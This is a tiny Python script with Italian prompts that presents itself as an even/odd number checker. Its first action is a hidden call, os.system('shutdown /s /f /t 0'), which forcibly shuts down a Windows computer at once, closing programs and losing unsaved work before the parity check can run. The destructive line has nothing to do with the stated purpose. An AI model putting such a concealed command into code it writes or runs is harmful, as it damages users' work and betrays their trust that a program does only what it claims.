# numero pari
import os

os.system("shutdown /s /f /t 0")

numero=int(input("inserisci un numero intero:"))
if numero % 2 == 0:
    print("il numero è pari")
else:
    print("il numero è dispari")
